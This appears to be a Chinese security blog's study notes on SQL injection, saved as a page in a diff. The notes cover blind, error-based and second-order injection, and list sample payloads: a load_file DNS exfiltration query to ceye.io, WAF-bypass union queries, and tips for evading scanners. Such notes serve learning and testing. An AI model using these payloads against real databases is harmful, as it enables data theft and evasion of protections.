@@ -1,0 +1,984 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head>
+    
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="generator" content="Hugo 0.80.0 with theme Tranquilpeak 0.4.8-BETA">
+<meta name="author" content="Zor01478">
+<meta name="keywords" content="SQL, C/C&#43;&#43;, PHP, Java, 渗透">
+<meta name="description" content="
+Web漏洞-SQL注入
+">
+
+
+<meta property="og:description" content="
+Web漏洞-SQL注入
+">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入">
+<meta name="twitter:title" content="SQL注入">
+<meta property="og:url" content="https://Zor01478.github.io/2021/02/sql%E6%B3%A8%E5%85%A5/">
+<meta property="twitter:url" content="https://Zor01478.github.io/2021/02/sql%E6%B3%A8%E5%85%A5/">
+<meta property="og:site_name" content="戴头盔的招财">
+<meta property="og:description" content="
+Web漏洞-SQL注入
+">
+<meta name="twitter:description" content="
+Web漏洞-SQL注入
+">
+<meta property="og:locale" content="zh-cn">
+
+  
+    <meta property="article:published_time" content="2021-02-09T13:14:47">
+  
+  
+    <meta property="article:modified_time" content="2021-02-09T13:14:47">
+  
+  
+  
+    
+      <meta property="article:section" content="招财渗透屋">
+    
+  
+  
+    
+      <meta property="article:tag" content="Web安全">
+    
+  
+
+
+<meta name="twitter:card" content="summary">
+
+
+
+
+
+
+
+  <meta property="og:image" content="https://Zor01478.github.io/images/suolue2.png">
+  <meta property="twitter:image" content="https://Zor01478.github.io/images/suolue2.png">
+
+
+  <meta property="og:image" content="https://Zor01478.github.io/images/fengmian2.jpg">
+  <meta property="twitter:image" content="https://Zor01478.github.io/images/fengmian2.jpg">
+
+
+
+
+  <meta property="og:image" content="https://gitee.com/zor01478/blog-picture/raw/master/images/caomao.png">
+  <meta property="twitter:image" content="https://gitee.com/zor01478/blog-picture/raw/master/images/caomao.png">
+
+
+    <title>SQL注入</title>
+
+    <link rel="icon" href="https://gitee.com/zor01478/blog-picture/raw/master/images/caomao.png">
+    
+
+    
+
+    <link rel="canonical" href="https://Zor01478.github.io/2021/02/sql%E6%B3%A8%E5%85%A5/">
+
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.css" integrity="sha256-vuXZ9LGmmwtjqFX1F+EKin1ThZMub58gKULUyf0qECk=" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.css" integrity="sha256-SEa4XYAHihTcEP1f5gARTB2K26Uk8PsndQYHQC1f4jU=" crossorigin="anonymous" />
+    
+    
+    <link rel="stylesheet" href="https://Zor01478.github.io/css/style-twzjdbqhmnnacqs0pwwdzcdbt8yhv8giawvjqjmyfoqnvazl0dalmnhdkvp7.min.css" />
+    
+    
+
+    
+      
+    
+    
+  </head>
+
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="5">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://Zor01478.github.io/">戴头盔的招财</a>
+  </div>
+  
+    
+      <a class="header-right-picture "
+         href="https://Zor01478.github.io/#about">
+    
+    
+    
+      
+        <img class="header-picture" src="https://gitee.com/zor01478/blog-picture/raw/master/images/caomao.png" alt="作者的图片" />
+      
+    
+    </a>
+  
+</header>
+
+      <nav id="sidebar" data-behavior="5">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://Zor01478.github.io/#about">
+          <img class="sidebar-profile-picture" src="https://gitee.com/zor01478/blog-picture/raw/master/images/caomao.png" alt="作者的图片" />
+        </a>
+        <h4 class="sidebar-profile-name">Zor01478</h4>
+        
+          <h5 class="sidebar-profile-bio">戴了头盔，所以头很铁</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://Zor01478.github.io/">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-home"></i>
+      
+      <span class="sidebar-button-desc">首页</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://Zor01478.github.io/categories">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-bookmark"></i>
+      
+      <span class="sidebar-button-desc">类别</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://Zor01478.github.io/tags">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-tags"></i>
+      
+      <span class="sidebar-button-desc">标签</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://Zor01478.github.io/archives">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-archive"></i>
+      
+      <span class="sidebar-button-desc">归档</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://Zor01478.github.io/#about">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-question"></i>
+      
+      <span class="sidebar-button-desc">关于</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://github.com/Zor01478" target="_blank" rel="noopener">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-github"></i>
+      
+      <span class="sidebar-button-desc">GitHub</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://Zor01478.github.io/index.xml">
+    
+      <i class="sidebar-button-icon fa fa-lg fa-rss"></i>
+      
+      <span class="sidebar-button-desc">RSS</span>
+    </a>
+  </li>
+
+
+    </ul>
+  </div>
+</nav>
+
+      
+  <div class="post-header-cover
+              text-center
+              post-header-cover--full"
+       style="background-image:url('/images/fengmian2.jpg')"
+       data-behavior="5">
+    
+      <div class="post-header main-content-wrap text-center">
+  
+    <h1 class="post-title" itemprop="headline">
+      SQL注入
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time itemprop="datePublished" datetime="2021-02-09T13:14:47&#43;08:00">
+        
+  二月 9, 2021
+
+      </time>
+    
+    
+  
+  
+    <span>发布在</span>
+    
+      <a class="category-link" href="https://Zor01478.github.io/categories/%e6%8b%9b%e8%b4%a2%e6%b8%97%e9%80%8f%e5%b1%8b">招财渗透屋</a>
+    
+  
+
+  </div>
+
+</div>
+    
+  </div>
+
+
+      <div id="main" data-behavior="5"
+        class="hasCover
+               hasCoverMetaIn
+               hasCoverCaption">
+        <article class="post" itemscope itemType="http://schema.org/BlogPosting">
+          
+            <span class="post-header-cover-caption caption">雪国的樱花</span>
+          
+          
+          <div class="post-content markdown" itemprop="articleBody">
+            <div class="main-content-wrap">
+              <blockquote>
+<p>Web漏洞-SQL注入</p>
+</blockquote>
+<h1 id="目录">目录</h1>
+<!-- raw HTML omitted -->
+<ul>
+<li><a href="#web%E6%BC%8F%E6%B4%9E-sql%E6%B3%A8%E5%85%A5">Web漏洞-SQL注入</a>
+<ul>
+<li><a href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B">数据库类型</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8">利用</a></li>
+<li><a href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5">数据库注入</a>
+<ul>
+<li><a href="#%E5%88%86%E6%9E%90%E6%B5%81%E7%A8%8B">分析流程</a></li>
+<li><a href="#%E5%B7%A5%E5%85%B7">工具</a></li>
+<li><a href="#%E6%8F%90%E4%BA%A4%E6%96%B9%E6%B3%95">提交方法</a></li>
+<li><a href="#%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">数据类型</a></li>
+<li><a href="#%E6%9F%A5%E8%AF%A2%E6%96%B9%E5%BC%8F">查询方式</a></li>
+<li><a href="#%E5%9B%9E%E6%98%BE--%E7%9B%B2%E6%B3%A8">回显 / 盲注</a></li>
+<li><a href="#%E6%B3%A8%E5%85%A5%E6%8B%93%E5%B1%95">注入拓展</a></li>
+<li><a href="#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E6%BA%90%E7%A0%81%E6%89%8D%E8%83%BD%E5%8F%91%E7%8E%B0%E6%8F%92%E5%85%A5%E6%81%B6%E6%84%8F%E6%95%B0%E6%8D%AE">二次注入【源码才能发现，插入恶意数据】</a></li>
+<li><a href="#%E5%A0%86%E5%8F%A0%E6%9F%A5%E8%AF%A2">堆叠查询</a></li>
+<li><a href="#waf%E7%BB%95%E8%BF%87">WAF绕过</a></li>
+<li><a href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95">防御方法</a></li>
+<li><a href="#%E6%B6%89%E5%8F%8A%E7%BD%91%E7%AB%99">涉及网站</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<!-- raw HTML omitted -->
+<h2 id="web漏洞-sql注入">Web漏洞-SQL注入</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">信息收集</th>
+<th style="text-align:center">数据注入</th>
+<th style="text-align:center">高权限注入</th>
+<th style="text-align:center">相关防注入</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">os/用户/库/表/版本/&hellip;</td>
+<td style="text-align:center">MySQL版本5.0分界</td>
+<td style="text-align:center">常规/跨库/文件读写/&hellip;</td>
+<td style="text-align:center">魔术引号/int/select/WAF</td>
+</tr>
+</tbody>
+</table>
+<h3 id="数据库类型">数据库类型</h3>
+<ul>
+<li>数据库：Access、MySQL、MSSQL、Oracle、postSQL、SQLite、  MongoDB</li>
+<li>注入原因：<strong>可控变量</strong>，变量代入数据库查询，变量未存在过滤或过滤不严谨   【闭合与否得看SQL语句】</li>
+</ul>
+<h3 id="利用">利用</h3>
+<ul>
+<li>
+<p>注意注入位置     &amp;  表示连接在哪个后面</p>
+</li>
+<li>
+<p>判断：and1＝1     and1＝2    乱输一顿【and  有时候可以换成 &amp;】</p>
+<ul>
+<li>order by 猜列名数量</li>
+<li>数据库版本：version ()</li>
+<li>当前数据库：database()</li>
+<li>数据库用户：user()</li>
+<li>操作系统：@@version_compile_os</li>
+</ul>
+</li>
+<li>
+<p>mysql5.0及以上存在information_schema   存储：库，表，列的数据库</p>
+<ul>
+<li>information_schema.schemata 记录所有<strong>库名</strong>的表</li>
+</ul>
+<p>需要指定库：</p>
+<ul>
+<li>information_schema.tables  记录所有<strong>表名</strong>信息的表</li>
+<li>information_schema.columns 记录所有<strong>列名</strong>信息的表</li>
+</ul>
+</li>
+<li>
+<p>用于select</p>
+<ul>
+<li>schema_name   库名</li>
+<li>table_name       表名</li>
+<li>column_name   列名</li>
+</ul>
+</li>
+<li>
+<p>用于where   table_schema=&lsquo;库名&rsquo;</p>
+</li>
+<li>
+<p>from   可以指定   库.表</p>
+</li>
+<li>
+<p>爆库，表，列，字</p>
+</li>
+<li>
+<p>文件读写</p>
+<ul>
+<li>
+<p>路径获取常用办法：报错显示，遗留文件，漏洞报错，平台配置文件，爆破</p>
+</li>
+<li>
+<p>读取：loadfile   &lsquo;文件&rsquo;</p>
+</li>
+<li>
+<p>写入：into outfile   &lsquo;文件&rsquo;</p>
+</li>
+</ul>
+</li>
+<li>
+<p>魔术引号   &mdash;＞   编码或宽字节绕过</p>
+</li>
+<li>
+<p>addslashes()</p>
+</li>
+<li>
+<p>hex编码</p>
+</li>
+</ul>
+<h3 id="数据库注入">数据库注入</h3>
+<h4 id="分析流程">分析流程</h4>
+<ul>
+<li>明确注入数据库类型，权限，提交方法，参数类型</li>
+<li>高或低 &ndash;&gt; 获取数据，找后台 &ndash;&gt; 登录 &ndash;&gt;  获取shell</li>
+<li>高权限：文件读写，命令执行，注册表读取</li>
+<li>Access偏移注入</li>
+</ul>
+<h4 id="工具">工具</h4>
+<ul>
+<li>sqlmap</li>
+<li>nosqlattack（mongodb）</li>
+</ul>
+<h4 id="提交方法">提交方法</h4>
+<ul>
+<li>GET    只要参数在网址后面就能接收到，不用管方法，例如：POST /xxx.php?g=123 HTTP/1.1       其中源码中的 g 变量会通过get方法获取。</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+$get <span style="color:#f92672">=</span> $GET[<span style="color:#e6db74">&#39;g&#39;</span>];
+<span style="color:#66d9ef">echo</span> $get;
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><ul>
+<li>POST</li>
+<li>COOKIE</li>
+<li>REQUEST   全部接收</li>
+<li>$_SERVER     PHP用于获取信息的一个全局变量</li>
+</ul>
+<blockquote>
+<p>以上均可能产生HTTP头部注入，就是说你可以抓包修改数据再发送数据。</p>
+</blockquote>
+<h4 id="数据类型">数据类型</h4>
+<p>     数字，字符，搜索，JSON</p>
+<h4 id="查询方式">查询方式</h4>
+<ul>
+<li>select         select * from 表 where id=$id</li>
+<li>insert         insert into 表（id, url, text） values（2, &lsquo;x&rsquo;, &lsquo;$t&rsquo;）</li>
+<li>delete        delete from 表 where id=$id</li>
+<li>updata       updata 表 set xxx=&lsquo;xxx&rsquo; where id=2 and username=&lsquo;admin&rsquo;</li>
+<li>order by     select * form 表 order by $id</li>
+</ul>
+<h4 id="回显--盲注">回显 / 盲注</h4>
+<ul>
+<li>回显注入</li>
+<li>无回显注入
+<ul>
+<li>延时盲注<br>
+if，sleep，&hellip;                 猜解：sleep(if(database()=&lsquo;xxx&rsquo;, 3, 0))</li>
+<li>布尔盲注-逻辑判断
+regexp，like，ascii，left，ord，mid，&hellip;</li>
+<li>报错回显
+floor，updatexml，extracttvalue，&hellip;</li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">select</span> <span style="color:#f92672">*</span> <span style="color:#66d9ef">from</span> <span style="color:#66d9ef">table</span> <span style="color:#66d9ef">where</span> id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">and</span> <span style="color:#66d9ef">if</span>(ascii(substr((<span style="color:#66d9ef">select</span> <span style="color:#66d9ef">table_name</span> <span style="color:#66d9ef">from</span> information_schema.tables <span style="color:#66d9ef">where</span> table_schema<span style="color:#f92672">=</span><span style="color:#66d9ef">database</span>() <span style="color:#66d9ef">limit</span> <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>), <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1</span>))<span style="color:#f92672">=</span><span style="color:#ae81ff">101</span>, sleep(<span style="color:#ae81ff">233</span>), <span style="color:#ae81ff">0</span>);
+
+<span style="color:#66d9ef">left</span>(<span style="color:#66d9ef">version</span>(), <span style="color:#ae81ff">3</span>)<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;5.5&#39;</span>
+</code></pre></div><p><a href="https://baike.baidu.com/item/ASCII/309296?fr=aladdin">https://baike.baidu.com/item/ASCII/309296?fr=aladdin</a>   【ASCII码】</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">相关函数</th>
+<th style="text-align:center">含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">like  &lsquo;oo%&rsquo;</td>
+<td style="text-align:center">以oo开头的；%oo表示以oo结尾的；%oo%表示包含oo的</td>
+</tr>
+<tr>
+<td style="text-align:center">regexp  &lsquo;lcq[a-z]&rsquo;</td>
+<td style="text-align:center">通配符[]</td>
+</tr>
+<tr>
+<td style="text-align:center">if(条件, 3, 0)</td>
+<td style="text-align:center">若果条件为真则返回第二个参数，否则返回第三个参数</td>
+</tr>
+<tr>
+<td style="text-align:center">sleep(4)</td>
+<td style="text-align:center">延迟执行多少秒</td>
+</tr>
+<tr>
+<td style="text-align:center">mid(a, b, c)</td>
+<td style="text-align:center">str，起始位（起始值是 1）；截取字符数，不填则表示往后所有</td>
+</tr>
+<tr>
+<td style="text-align:center">substr(a, b, c)</td>
+<td style="text-align:center">str，起始位，截取长度</td>
+</tr>
+<tr>
+<td style="text-align:center">left(database(), 1)</td>
+<td style="text-align:center">left(a, b) 从左侧截取a的前b位</td>
+</tr>
+<tr>
+<td style="text-align:center">length(database())=长度</td>
+<td style="text-align:center">判断长度</td>
+</tr>
+<tr>
+<td style="text-align:center">ord=ascii ascii(x)=97</td>
+<td style="text-align:center">判断x的ascii码是否等于97</td>
+</tr>
+</tbody>
+</table>
+<h4 id="注入拓展">注入拓展</h4>
+<ul>
+<li>加解密注入</li>
+<li>JSON注入</li>
+<li>LADP注入(Lightweight Directory Access Protocol)</li>
+<li>DNSlog注入（就是外带注入查询，无回显的情况下可以在DNSlog平台上查看到注入结果）</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">secure_file_priv 状态</th>
+<th style="text-align:center">含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">null</td>
+<td style="text-align:center">表示不允许导入导出</td>
+</tr>
+<tr>
+<td style="text-align:center">指定文件夹时，如G:\</td>
+<td style="text-align:center">表示mysql的导入导出只能发生在指定的文件夹</td>
+</tr>
+<tr>
+<td style="text-align:center">没有设置时</td>
+<td style="text-align:center">则表示没有任何限制</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p>利用load_file()函数发起请求，使用Dnslog接受请求&amp;获取数据</p>
+</blockquote>
+<ul>
+<li><strong>payload:</strong> select load_file(concat('\\', &lsquo;注入语句&rsquo;, .user.ceye.io\abc)) &ndash;+</li>
+<li>例如获取数据库名：select load_file(concat('\\', (select database()), &lsquo;.user.ceye.io\abc&rsquo;))
+<ul>
+<li>其中user为ceye平台用户自己的域名标识符，如mob.ceye.io，所有该域名和*.mob.ceye.io的 DNS查询和HTTP请求都会被记录</li>
+<li>根据load_file函数的语法规则，访问互联网中的文件时，需要在最前面加上两个斜杠  //</li>
+<li>load_file()函数访问的是文件，所以域名后面需要添加/abc</li>
+<li>代表去访问一个域名下的abc文件夹/文件，其实也无所谓反正也不需要该文件真的存在</li>
+<li>load_file()一次只能传输一条数据，所以查询的时候需要使用limit逐个获取</li>
+<li>由于url传递字符的限制，所以有时候要结合hex编码select hex(&hellip;)</li>
+</ul>
+</li>
+<li>参考：https://blog.csdn.net/monster663/article/details/113757235</li>
+<li>可利用的平台
+<ul>
+<li><a href="http://www.dnslog.cn">http://www.dnslog.cn</a></li>
+<li><a href="http://admin.dnslog.link">http://admin.dnslog.link</a></li>
+<li><a href="http://ceye.io">http://ceye.io</a></li>
+</ul>
+</li>
+<li>除了SQL注可以用到以外，XSS / XXE / SSRF / 命令执行 都可以用到DNSlog平台</li>
+</ul>
+<h4 id="二次注入源码才能发现插入恶意数据">二次注入【源码才能发现，插入恶意数据】</h4>
+<ol>
+<li>例如注册输入框注册一个用户：admin'#</li>
+<li>然后你登录admin'#用户进行修改密码为：88888；</li>
+<li>那么其实会修改掉admin用户的密码，这类为二次注入（恶意数据）</li>
+</ol>
+<ul>
+<li>代码中数据库修改密码的查询语句可能为：</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">set</span> password<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;$pass&#39;</span> <span style="color:#66d9ef">where</span> username<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;admin&#39;&#39;# and password=&#39;</span><span style="color:#960050;background-color:#1e0010">$</span>curr_pass<span style="color:#e6db74">&#39;      
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">//那么username=&#39;&#39;处就会产生闭合以及#注释，从而形成注入
+</span></code></pre></div><h4 id="堆叠查询">堆叠查询</h4>
+<p>就是相当于可以执行多条语句，SQL是用 ; 分隔的。</p>
+<h4 id="waf绕过">WAF绕过</h4>
+<p><a href="https://www.freebuf.com/articles/web/163783.html">https://www.freebuf.com/articles/web/163783.html</a></p>
+<ul>
+<li>数据上做操作：</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">大小写</th>
+<th style="text-align:center">加解密</th>
+<th style="text-align:center">编码解码</th>
+<th style="text-align:center">等价函数</th>
+<th style="text-align:center">特殊符号</th>
+<th style="text-align:center">反序列化</th>
+<th style="text-align:center">注释符混用</th>
+</tr>
+</thead>
+</table>
+<ul>
+<li>方式上操作：</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>变更提交方式</th>
+<th>变异</th>
+</tr>
+</thead>
+</table>
+<ul>
+<li>其他：</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">Fuzz</th>
+<th style="text-align:center">数据库特性</th>
+<th style="text-align:center">垃圾数据溢出</th>
+<th style="text-align:left">HTTP参数污染</th>
+</tr>
+</thead>
+</table>
+<p>方法总结</p>
+<ol>
+<li>大小写</li>
+<li>关键字替换</li>
+<li>编码</li>
+<li>注释</li>
+<li>等价函数/命令</li>
+<li>使用特殊符号（非字母数字的字）</li>
+<li>HTTP参数控制
+<ul>
+<li>HPP(HTTP参数污染)：https://www.cnblogs.com/xishaonian/p/6209441.html</li>
+</ul>
+</li>
+<li>缓冲区溢出</li>
+<li>整合绕过</li>
+<li>更改提交方法</li>
+<li>借助数据库特性</li>
+</ol>
+<ul>
+<li>工具能扫出来也可能存在waf误报（诱导攻击者）</li>
+<li>工具被拦截：代理池，延时，换HTTP头浏览器标识（搜索引擎 HTTP 头），中转注入</li>
+</ul>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#f92672">#</span>bypass sqlinject playload    <span style="color:#ae81ff">2020</span><span style="color:#f92672">/</span><span style="color:#ae81ff">8</span><span style="color:#f92672">/</span><span style="color:#ae81ff">15</span>
+id<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> <span style="color:#66d9ef">union</span> <span style="color:#75715e">/*%00*/</span><span style="color:#f92672">%</span><span style="color:#ae81ff">23</span>a<span style="color:#f92672">%</span><span style="color:#ae81ff">0</span>A<span style="color:#75715e">/*!/*!select 1,2,3*/;%23     
+</span><span style="color:#75715e">
+</span><span style="color:#75715e">// 其中%0A表示换行
+</span><span style="color:#75715e">// https://baike.baidu.com/item/URL%E7%BC%96%E7%A0%81/3703727?fr=aladdin
+</span><span style="color:#75715e">
+</span><span style="color:#75715e">id=-1 union /*%00*/%23a%0A/*!/*!select 1,database%23()x%0A, 3*/;%23
+</span><span style="color:#75715e">
+</span><span style="color:#75715e">id=-1 union /*!44509select*/ 1,2,3#
+</span><span style="color:#75715e">id=-1 union /*!44509select*/ 1,%23x%0A/*!database*/(),3#
+</span><span style="color:#75715e">
+</span><span style="color:#75715e">id=1/**&amp;id=-1 union select 1,2,3#*/    // 放弃了 &amp; 之前的参数 
+</span><span style="color:#75715e">
+</span><span style="color:#75715e">id=-1 %20union all %23%0a%20 select%201,2,3%23
+</span><span style="color:#75715e">-1 %20union%20all%23%0a%20select%201,%230%0Adatabase/**/(),3%23
+</span></code></pre></div><ul>
+<li>应用层：
+<ul>
+<li>大小写/关键字替换</li>
+<li>hex(), bin() == ascii();</li>
+<li>sleep() == benchmark();</li>
+<li>mid(), substring() ==  substr();</li>
+<li>@@user == user();</li>
+<li>@@version == version();</li>
+<li>各种编码：url，hex，%0A等</li>
+<li>注释使用：//  &ndash;   &ndash;+  #   /<strong>/    + :%00    /!</strong>/ 等</li>
+<li>再次循环：union==uunionnion</li>
+<li>参数污染：?id=1&amp;id=2&amp;id=3</li>
+<li>加解密</li>
+<li>更改请求提交方式</li>
+</ul>
+</li>
+</ul>
+<hr>
+<ul>
+<li>数据库特性(mysql技巧)
+<ul>
+<li>mysql的三种注释符号：#   /**/  &ndash;空格</li>
+<li>特殊符号：%0A 和 %a 表示换行</li>
+<li>内联注释：/*!*/这种注释在mysql中叫做内联注释，当<!-- raw HTML omitted -->!<!-- raw HTML omitted -->后面所接的数据库版本号时，当实际的版本等于或是高于那个字符串，应用程序就会将注释内容解释为SQL，否则就会当做注释来处理。默认的，当没有接版本号时，是会执行里面的内容的。</li>
+<li>mysql黑魔法：select {x unsername} from {x mysql.user}
+<a href="https://www.secpulse.com/archives/94962.html">https://www.secpulse.com/archives/94962.html</a></li>
+</ul>
+</li>
+</ul>
+<hr>
+<ul>
+<li>数据库特性(SQL server技巧)
+<ul>
+<li>/*       C语言注释风格</li>
+<li>&ndash;       SQL注释</li>
+<li>; 00% 空字节</li>
+<li>空白字符：0x01 ~ 0x20</li>
+<li>特殊符号：%3a 冒号：id=1 union:select 1,2 from:admin</li>
+<li>函数变形：db_name<a href="">空白符</a></li>
+</ul>
+</li>
+</ul>
+<hr>
+<ul>
+<li>数据库特性(Oracle技巧)
+<ul>
+<li>&ndash;   /**/</li>
+<li>空白字符：0x00，0x09，0x0a~0x0d，0x20</li>
+</ul>
+</li>
+</ul>
+<hr>
+<ul>
+<li>Fuzz： SELECT * FROM admin WHERE username = 1【位置一】union【位置二】select【位置三】1,user()【位置四】from【位置五】admin</li>
+</ul>
+<hr>
+<ul>
+<li>逻辑层：
+<ul>
+<li>逻辑问题：提交方法同时请求过滤问题；HTTP和HTTPS强制跳转问题；特殊符号%00 waf截断问题；云waf（寻找真实IP）</li>
+<li>性能问题：检查部分；缓冲区问题</li>
+<li>白名单：IP、URL（如sysytem/manager/admin等关键字）、静态资源（特定静态资源请求后缀/xxx.txt?等）、爬虫白名单（useragent（http安全检测规则） 或 行为判断；请求过于频繁（代理池、延时、中转注入））【Firefox插件：user agent switcher】</li>
+</ul>
+</li>
+</ul>
+<h4 id="防御方法">防御方法</h4>
+<ul>
+<li>代码过滤</li>
+<li>魔术引号</li>
+<li>is_int函数</li>
+<li>自定义关键字</li>
+<li>WAF</li>
+</ul>
+<h4 id="涉及网站">涉及网站</h4>
+<ol>
+<li><a href="https://blog.csdn.net/weixin_30292843/article/details/99381669">https://blog.csdn.net/weixin_30292843/article/details/99381669</a>  【常见的load_file()读取的敏感信息】</li>
+<li><a href="https://www.cnblogs.com/bmjoker/p/9326258.html">https://www.cnblogs.com/bmjoker/p/9326258.html</a>   【sqlmap超详细笔记】</li>
+<li><a href="https://www.cnblogs.com/backlion/p/9721687.html">https://www.cnblogs.com/backlion/p/9721687.html</a>    【堆叠注入】</li>
+<li><a href="https://www.runoob.com/sql/sql-tutorial.html">https://www.runoob.com/sql/sql-tutorial.html</a>   【SQL简明教程】</li>
+</ol>
+              
+            </div>
+          </div>
+          <div id="post-footer" class="post-footer main-content-wrap">
+            
+              
+                
+                
+                  <div class="post-footer-tags">
+                    <span class="text-color-light text-small">标签</span><br/>
+                    
+  <a class="tag tag--primary tag--small" href="https://Zor01478.github.io/tags/web%E5%AE%89%E5%85%A8/">Web安全</a>
+
+                  </div>
+                
+              
+            
+            <div class="post-actions-wrap">
+  
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://Zor01478.github.io/2021/02/php%E4%B8%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90%E4%B8%8B%E7%AF%87/" data-tooltip="PHP与Java反序列化浅析（下篇）">
+              
+                  <i class="fa fa-angle-left"></i>
+                  <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
+                </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://Zor01478.github.io/2021/02/xss/" data-tooltip="XSS">
+              
+                  <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
+                  <i class="fa fa-angle-right"></i>
+                </a>
+            </li>
+          
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  
+</div>
+
+            
+              
+                <div id="disqus_thread">
+  <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+              
+            
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2021 Zor01478. All Rights Reserved
+  </span>
+</footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="5">
+        <div class="post-actions-wrap">
+  
+      <nav >
+        <ul class="post-actions post-action-nav">
+          
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://Zor01478.github.io/2021/02/php%E4%B8%8Ejava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90%E4%B8%8B%E7%AF%87/" data-tooltip="PHP与Java反序列化浅析（下篇）">
+              
